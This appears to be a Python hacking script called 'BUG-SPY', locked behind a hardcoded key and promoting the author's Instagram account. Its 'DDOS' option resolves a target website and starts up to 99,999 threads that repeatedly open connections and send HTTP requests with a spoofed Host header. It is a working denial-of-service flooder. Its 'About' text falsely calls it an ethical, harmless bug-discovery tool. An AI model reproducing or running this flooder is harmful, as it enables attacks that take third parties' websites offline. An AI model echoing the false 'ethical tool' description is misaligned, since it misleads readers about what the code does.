import socket
import threading
from urllib.parse import urlparse
import webbrowser
import time
import os
from termcolor import colored

g = "\x1b[32m\x1b[1m"
sb = "\x1b[36m\x1b[1m"
d = "\x1b[0m"
r = "\x1b[31m\x1b[1m"
instagram = 'https://instagram.com/__king_of_hackers__?igshid=MzNlNGNkZWQ4Mg=='
webbrowser.open(instagram)
os.system('clear')
bnr = ''' 
██████╗ ██╗   ██╗ ██████╗     ███████╗██████╗ ██╗   ██╗
██╔══██╗██║   ██║██╔════╝     ██╔════╝██╔══██╗╚██╗ ██╔╝
██████╔╝██║   ██║██║  ███╗    ███████╗██████╔╝ ╚████╔╝ 
██╔══██╗██║   ██║██║   ██║    ╚════██║██╔═══╝   ╚██╔╝  
██████╔╝╚██████╔╝╚██████╔╝    ███████║██║        ██║   
╚═════╝  ╚═════╝  ╚═════╝     ╚══════╝╚═╝        ╚═╝   
                                                       
'''
print(g, bnr, d)

credit = '''
          |-----------------------|
          |                       |
《========| Credit —》SUKH-H4CK3R |========》
          |                       |
          |-----------------------|
'''

print(sb + credit + d)

insta = ('insta')
pswd = 'sukh'
nt = print(r, "Note", d, sb, "If you don't have the key, you can message me on Instagram. To go to Instagram, type 'insta'.\n",)
user_pswd = (input(colored("Enter the key to continue (type 'exit' to quit): ", 'yellow')))
if user_pswd == pswd:
    g = "\x1b[32m\x1b[1m"
    sb = "\x1b[36m\x1b[1m"
    d = "\x1b[0m"

    target_ip = ''
    fake_ip = ''
    attack_num = 0
    stop_event = threading.Event()

    def attack():
        global attack_num
        while True:
            if stop_event.is_set():
                break

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, port))
            s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))

            attack_num += 1
            print(attack_num)

            s.close()

    def get_ip_and_port(url):
        global target_ip, fake_ip, port
        try:
            parsed_url = urlparse(url)
            hostname = parsed_url.hostname

            if not hostname:
                print("Invalid URL")
                return

            target_ip = socket.gethostbyname(hostname)
            port = parsed_url.port if parsed_url.port else 80

            #print(f"IP Address: {target_ip}Port: {port}")
        except socket.gaierror:
            print("Invalid URL or unable to resolve the host.")

    print(g, '''
1. DDOS
2. Instagram
3. About
00. Exit
''')
    user_response = int(input("Choose One Option : "))
    if user_response == 1:
        # target
        os.system('clear')
        print(g, bnr, d)
        time.sleep(2)
        print(r, "Warning :—", d, sb +  "If you misuse the Bug-Spy tool, you will be solely responsible for it, not the author (SUKH-H4CK3R).\n", d)
        time.sleep(2)
        print(g)
        get_ip_and_port(input("Enter Target Web-Site URL : "))
        fake_ip = '182.21.20.32'
        max_attacks = int(input("Enter Number of Traffic [MAX = 99999] : "))
        if max_attacks < 100000:
            # number of traffic
            for i in range(max_attacks):
                thread = threading.Thread(target=attack)
                thread.start()

        else:
            print("Plzz Enter a Number less-than 100000!")
    
        stop_event.set()
    elif user_response == 2:
        #channel_url = "https://instagram.com/__king_of_hackers__?igshid=MzNlNGNkZWQ4Mg=="
        print("Redirecting On My Instagram...")
        time.sleep(3)
        webbrowser.open(instagram)
    elif user_response == 3:
        os.system('clear')
        print(g, bnr, d)
        time.sleep(3)
        print(sb, '''
Description: BUG-SPY, developed by SUKH-H4CK3R, is an ethical and responsible bug discovery tool. This Python-based tool is designed to assist developers and security enthusiasts in identifying potential vulnerabilities and bugs in software applications.

Purpose:
The primary purpose of BUG-SPYl is to help developers, security researchers, and ethical hackers to find and report vulnerabilities in their software systems. By using this tool responsibly, we can contribute to improving the overall security and reliability of various software applications and web services.

Responsible Use:
BUG-SPY is intended for ethical use only. It should not be used for any malicious or illegal activities. Users are encouraged to adhere to ethical guidelines and legal boundaries while conducting bug-finding activities. Unauthorized access, exploitation, or any form of malicious intent is strictly prohibited.

Education and Awareness:
BUG-SPY aims to educate and raise awareness about the importance of cybersecurity and proactive bug discovery. It empowers users to be proactive in identifying potential weaknesses, allowing them to address these issues before they are exploited by malicious entities.

No Harmful Actions:
BUG-SPY does not engage in any harmful activities, such as data breaches, unauthorized access, or damage to systems. It is designed to be a safe and responsible tool, ensuring that users focus solely on finding and reporting bugs and vulnerabilities.

Acknowledgment:
BUG-SPY is a product of SUKH-H4CK3R's passion for cybersecurity and ethical hacking. The tool is shared with the community to promote responsible bug discovery and cybersecurity awareness.

For more updates and ethical hacking content, follow SUKH-H4CK3R on Instagram: [https://instagram.com/king_of_hackers?igshid=MzNlNGNkZWQ4Mg==]
Instagram Username: @__king_of_hackers__

Remember, responsible bug finding is an essential aspect of maintaining a secure digital environment. Always use your skills and tools responsibly and legally to contribute positively to the cybersecurity community.
''')
    elif user_response == 00:
        print("Thanks For Using BUG-SPY Tool")    
        print("Exit...")
        time.sleep(2)
        exit()
    else:
        print("Plzz Choose Vaild Number!")  
        
elif user_pswd == insta:
    webbrowser.open(instagram)
elif user_pswd.lower() == 'exit':
    print("Exiting...")
    time.sleep(2)
    exit()
else:
    print("Incorrect password. Try again!")    


